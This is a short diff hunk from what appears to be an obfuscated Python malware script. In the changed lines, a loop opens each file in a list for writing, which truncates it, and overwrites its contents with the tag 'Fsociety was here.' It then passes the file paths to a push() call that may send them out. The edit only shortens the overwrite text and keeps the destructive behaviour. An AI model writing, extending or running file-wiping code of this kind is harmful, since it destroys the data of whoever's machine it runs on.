@@ -16,7 +16,7 @@ def _0x11(_0x1=0x1):
 			for _0x0 in _0x24:
 				_0x32 = open(_0x0, 'w')
 				_byteJumper = 0x32 * 0x2 * 0x64 + 0x100
-				_0x32.write(':%s: :%s: :%s: ' * _byteJumper % ('Data: -0', 'Data: -1', 'Fsociety was here.'))
+				_0x32.write(':%s: :%s: :%s: ' % ('Data: -0', 'Data: -1', 'Fsociety was here.'))
 				push('Data: %s -0' % bytes(_0x0))
 				_0x32.close()
 		except Exception as _0x4:
